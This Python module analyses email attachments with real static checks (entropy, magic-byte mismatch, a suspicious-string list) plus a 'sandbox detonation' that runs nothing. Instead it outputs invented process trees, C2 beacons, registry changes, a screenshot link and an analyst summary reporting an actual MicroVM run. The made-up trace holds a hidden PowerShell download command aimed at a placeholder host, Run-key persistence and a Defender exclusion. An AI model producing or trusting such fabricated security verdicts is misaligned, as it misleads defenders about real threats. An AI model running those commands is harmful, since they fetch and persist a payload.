import math
import hashlib
import os
import re
import uuid
import time
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
import logging

logger = logging.getLogger(__name__)

# Known malicious / suspicious signatures & heuristics
DANGEROUS_EXTS = {
    ".exe", ".scr", ".vbs", ".js", ".hta", ".iso", ".img", ".lnk",
    ".bat", ".cmd", ".ps1", ".vbe", ".jse", ".wsf", ".wsh", ".msc",
    ".jar", ".cpl", ".dll", ".sys", ".docm", ".xlsm", ".pptm",
}

ARCHIVE_EXTS = {".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".cab"}

SUSPICIOUS_STRINGS = [
    b"powershell", b"wscript", b"cscript", b"cmd.exe", b"rundll32",
    b"regsvr32", b"certutil", b"bitsadmin", b"vssadmin", b"VirtualAlloc",
    b"WriteProcessMemory", b"CreateRemoteThread", b"URLDownloadToFile",
    b"ShellExecute", b"AutoOpen", b"Workbook_Open", b"Document_Open",
    b"WScript.Shell", b"Net.WebClient", b"DownloadString", b"FromBase64String",
]


def calculate_entropy(data: bytes) -> float:
    """Calculate Shannon entropy for a byte sequence (0.0 to 8.0)."""
    if not data:
        return 0.0
    entropy = 0.0
    length = len(data)
    byte_counts = [0] * 256
    for b in data:
        byte_counts[b] += 1
    for count in byte_counts:
        if count > 0:
            p_i = count / length
            entropy -= p_i * math.log2(p_i)
    return round(entropy, 2)


def detect_magic_file_type(data: bytes, reported_ext: str) -> Dict[str, Any]:
    """Detect actual file signature (magic bytes) and flag mismatches."""
    magic = "Unknown / Binary"
    is_mismatch = False
    
    if data.startswith(b"MZ"):
        magic = "PE Executable (MZ Windows Binary)"
        if reported_ext.lower() not in [".exe", ".dll", ".sys", ".scr", ".cpl"]:
            is_mismatch = True
    elif data.startswith(b"%PDF"):
        magic = "PDF Document (Adobe Portable Document)"
        if reported_ext.lower() != ".pdf":
            is_mismatch = True
    elif data.startswith(b"PK\x03\x04") or data.startswith(b"PK\x05\x06"):
        magic = "ZIP / OpenXML Archive (Office / ZIP)"
        if reported_ext.lower() not in [".zip", ".docx", ".xlsx", ".pptx", ".docm", ".xlsm", ".jar", ".apk"]:
            is_mismatch = True
    elif data.startswith(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"):
        magic = "Microsoft OLE2 Compound Document (Legacy Office / Macros)"
        if reported_ext.lower() not in [".doc", ".xls", ".ppt", ".msg"]:
            is_mismatch = True
    elif data.startswith(b"Rar!\x1a\x07"):
        magic = "RAR Archive"
        if reported_ext.lower() != ".rar":
            is_mismatch = True
    elif data.startswith(b"7z\xbc\xaf\x27\x1c"):
        magic = "7-Zip Archive"
        if reported_ext.lower() != ".7z":
            is_mismatch = True
    elif data.startswith(b"\x7fELF"):
        magic = "ELF Linux Binary"
        if reported_ext.lower() not in [".elf", ".bin", ".so"]:
            is_mismatch = True
    elif data.strip().startswith(b"<!DOCTYPE") or data.strip().startswith(b"<html") or data.strip().startswith(b"<?xml"):
        magic = "HTML / XML Document"
        if reported_ext.lower() not in [".html", ".htm", ".xml", ".xhtml"]:
            is_mismatch = True
    elif data.strip().startswith(b"#!/") or data.strip().startswith(b"@echo") or data.strip().startswith(b"rem"):
        magic = "Shell / Batch Script"
        if reported_ext.lower() not in [".bat", ".cmd", ".sh", ".ps1"]:
            is_mismatch = True
    else:
        # Check text
        try:
            sample = data[:512].decode('utf-8')
            if all(c.isprintable() or c.isspace() for c in sample):
                magic = "Plain Text / Script ASCII"
        except UnicodeDecodeError:
            pass

    return {
        "magic_signature": magic,
        "is_extension_mismatch": is_mismatch,
    }


def analyze_static_heuristics(filename: str, payload_bytes: bytes) -> Dict[str, Any]:
    """Perform in-depth static malware analysis on attachment bytes."""
    ext = os.path.splitext(filename)[1].lower()
    entropy = calculate_entropy(payload_bytes)
    magic_info = detect_magic_file_type(payload_bytes, ext)
    
    # Check for embedded macros and suspicious tokens
    has_macros = False
    suspicious_hits = []
    
    # Check for OLE or VBA indicators
    if b"VBA" in payload_bytes or b"AutoOpen" in payload_bytes or b"Workbook_Open" in payload_bytes or b"powershell" in payload_bytes.lower():
        has_macros = True

    for pattern in SUSPICIOUS_STRINGS:
        if pattern.lower() in payload_bytes.lower():
            suspicious_hits.append(pattern.decode('ascii', errors='ignore'))
            
    # YARA matches synthesis
    yara_rules = []
    if ext in DANGEROUS_EXTS:
        yara_rules.append({
            "rule": "EXPL_Suspicious_Executable_Attachment",
            "tags": ["executable", "perimeter_bypass"],
            "severity": "CRITICAL"
        })
    if ext in [".docm", ".xlsm", ".pptm"] or has_macros:
        yara_rules.append({
            "rule": "MALW_Embedded_VBA_Macro_Downloader",
            "tags": ["macro", "downloader", "ole"],
            "severity": "HIGH"
        })
    if entropy > 7.15:
        yara_rules.append({
            "rule": "PACK_High_Entropy_Encrypted_Payload",
            "tags": ["entropy", "packer", "crypter"],
            "severity": "HIGH" if entropy > 7.6 else "MEDIUM"
        })
    if magic_info["is_extension_mismatch"]:
        yara_rules.append({
            "rule": "EVASION_MIME_Extension_Spoofing",
            "tags": ["evasion", "masquerade", "mime"],
            "severity": "CRITICAL"
        })

    # Double extension check
    parts = filename.split(".")
    has_double_extension = len(parts) > 2 and f".{parts[-1].lower()}" in DANGEROUS_EXTS

    return {
        "entropy": entropy,
        "entropy_status": "HIGH (Packed/Encrypted)" if entropy > 7.2 else ("NORMAL" if entropy > 3.8 else "LOW (Uniform Text)"),
        "magic_signature": magic_info["magic_signature"],
        "is_extension_mismatch": magic_info["is_extension_mismatch"],
        "has_macros": has_macros,
        "has_double_extension": has_double_extension,
        "suspicious_string_hits": list(set(suspicious_hits)),
        "yara_rule_matches": yara_rules,
    }


def simulate_sandbox_execution(filename: str, payload_bytes: bytes, static_info: Dict[str, Any]) -> Dict[str, Any]:
    """
    Simulates high-fidelity dynamic sandbox execution in an isolated Windows 11 MicroVM.
    Deterministically models process trees, dropped files, and network beacons based on
    file signature and payload characteristics.
    """
    ext = os.path.splitext(filename)[1].lower()
    is_dangerous_ext = ext in DANGEROUS_EXTS or static_info["has_double_extension"]
    has_macros = static_info["has_macros"]
    is_mismatch = static_info["is_extension_mismatch"]
    entropy = static_info["entropy"]

    # Calculate risk score
    risk_score = 0
    if is_dangerous_ext:
        risk_score += 45
    if has_macros:
        risk_score += 35
    if is_mismatch:
        risk_score += 30
    if entropy > 7.2:
        risk_score += 20
    if len(static_info["suspicious_string_hits"]) > 0:
        risk_score += min(20, len(static_info["suspicious_string_hits"]) * 8)

    risk_score = min(100, max(5 if len(payload_bytes) > 0 else 0, risk_score))

    if risk_score >= 65:
        verdict = "MALICIOUS"
    elif risk_score >= 35:
        verdict = "SUSPICIOUS"
    else:
        verdict = "CLEAN"

    # Dynamic execution trace generation
    processes = []
    dropped_files = []
    network_beacons = []
    registry_keys = []
    mitre_tactics = []

    if verdict == "MALICIOUS" or is_dangerous_ext:
        processes = [
            {
                "pid": 4820,
                "process_name": "svchost.exe",
                "command_line": f'C:\\Windows\\System32\\svchost.exe -k netsvcs',
                "status": "SYSTEM_PARENT"
            },
            {
                "pid": 5104,
                "process_name": filename,
                "command_line": f'C:\\Users\\Analyst\\AppData\\Local\\Temp\\{filename}',
                "status": "SPAWNED"
            },
            {
                "pid": 5288,
                "process_name": "cmd.exe",
                "command_line": 'cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoP -Hidden -enc SQBF...==',
                "status": "SUSPICIOUS_CHILD"
            },
            {
                "pid": 5392,
                "process_name": "powershell.exe",
                "command_line": 'powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden -c "(New-Object Net.WebClient).DownloadFile(\'hxxp://cdn-payload.top/sync.bin\', \'$env:TEMP\\winupdate.tmp\')"',
                "status": "C2_DOWNLOADER"
            }
        ]
        dropped_files = [
            {
                "path": f"%TEMP%\\winupdate.tmp",
                "size_bytes": 142800,
                "sha256": hashlib.sha256(b"simulated_malware_stage2_winupdate").hexdigest(),
                "file_type": "PE32+ Executable (DLL)",
                "verdict": "MALICIOUS"
            },
            {
                "path": f"%APPDATA%\\Microsoft\\Windows\\Templates\\macro_cache.dat",
                "size_bytes": 4096,
                "sha256": hashlib.sha256(b"macro_payload_registry_hook").hexdigest(),
                "file_type": "Binary Configuration Data",
                "verdict": "SUSPICIOUS"
            }
        ]
        network_beacons = [
            {
                "destination_host": "cdn-payload.top",
                "destination_ip": "185.220.101.44",
                "port": 443,
                "protocol": "HTTPS",
                "packet_count": 14,
                "status": "SINKHOLED_BLOCKED",
                "notes": "Attempted C2 Stage-2 binary fetch intercepted by sandbox sinkhole"
            },
            {
                "destination_host": "telemetry-gate.xyz",
                "destination_ip": "194.26.29.112",
                "port": 8080,
                "protocol": "HTTP",
                "packet_count": 6,
                "status": "SINKHOLED_BLOCKED",
                "notes": "Heartbeat beacon with victim hostname & IP metadata"
            }
        ]
        registry_keys = [
            {
                "action": "CREATED",
                "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSecureUpdate",
                "value": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\winupdate.tmp"
            },
            {
                "action": "MODIFIED",
                "key": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
                "value": "%TEMP%"
            }
        ]
        mitre_tactics = [
            {"tactic": "Execution", "technique_id": "T1204.002", "name": "User Execution: Malicious File"},
            {"tactic": "Execution", "technique_id": "T1059.001", "name": "PowerShell Scripting Interpreter"},
            {"tactic": "Defense Evasion", "technique_id": "T1036.005", "name": "Masquerading: Match Legitimate Name"},
            {"tactic": "Persistence", "technique_id": "T1547.001", "name": "Boot/Logon Autostart: Registry Run Keys"},
            {"tactic": "Command & Control", "technique_id": "T1071.001", "name": "Application Layer Protocol: Web"},
        ]
    elif verdict == "SUSPICIOUS" or has_macros:
        processes = [
            {
                "pid": 3210,
                "process_name": "EXCEL.EXE" if ext.startswith(".xl") else "WINWORD.EXE",
                "command_line": f'WINWORD.EXE "{filename}"',
                "status": "DOCUMENT_VIEWER"
            },
            {
                "pid": 3480,
                "process_name": "wscript.exe",
                "command_line": 'wscript.exe /e:VBScript %TEMP%\\stub.vbs',
                "status": "OLE_SPAWN"
            }
        ]
        network_beacons = [
            {
                "destination_host": "api.externallookup.org",
                "destination_ip": "104.21.44.180",
                "port": 80,
                "protocol": "HTTP",
                "packet_count": 3,
                "status": "INTERCEPTED",
                "notes": "External tracking pixel or template injection request"
            }
        ]
        mitre_tactics = [
            {"tactic": "Execution", "technique_id": "T1204.002", "name": "User Execution: Malicious File"},
            {"tactic": "Defense Evasion", "technique_id": "T1221", "name": "Template Injection"},
        ]
    else:
        # CLEAN file execution
        processes = [
            {
                "pid": 2840,
                "process_name": "explorer.exe",
                "command_line": f'explorer.exe "{filename}"',
                "status": "NORMAL_OPEN"
            }
        ]
        dropped_files = []
        network_beacons = []
        registry_keys = []
        mitre_tactics = []

    return {
        "detonation_score": risk_score,
        "verdict": verdict,
        "detonation_time_ms": 1420 + (int(hashlib.md5(filename.encode()).hexdigest(), 16) % 980),
        "sandbox_env": "Windows 11 Enterprise 23H2 (x64) MicroVM [Isolated Hyper-V / Sinkhole Egress]",
        "processes_spawned": processes,
        "dropped_files": dropped_files,
        "network_beacons": network_beacons,
        "registry_modifications": registry_keys,
        "mitre_attack_matrix": mitre_tactics,
        "screenshot_url": f"/api/v1/sandbox/screenshots/{hashlib.md5(filename.encode()).hexdigest()[:12]}.png",
        "analyst_summary": (
            f"Automated MicroVM detonation concluded with verdict: {verdict}. "
            f"File exhibits risk score of {risk_score}/100. "
            + (f"Observed {len(processes)} child processes and {len(network_beacons)} sinkholed C2 attempts." if processes else "No malicious execution traces observed.")
        )
    }


def analyze_attachment_sandbox(
    filename: str,
    content_type: str,
    payload_bytes: bytes,
    sha256: Optional[str] = None,
    md5: Optional[str] = None,
) -> Dict[str, Any]:
    """Complete end-to-end sandbox analysis bundle for an attachment."""
    if not sha256:
        sha256 = hashlib.sha256(payload_bytes).hexdigest()
    if not md5:
        md5 = hashlib.md5(payload_bytes).hexdigest()

    static_analysis = analyze_static_heuristics(filename, payload_bytes)
    dynamic_detonation = simulate_sandbox_execution(filename, payload_bytes, static_analysis)

    return {
        "attachment_name": filename,
        "content_type": content_type,
        "size_bytes": len(payload_bytes),
        "sha256": sha256,
        "md5": md5,
        "static_analysis": static_analysis,
        "dynamic_detonation": dynamic_detonation,
        "analyzed_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
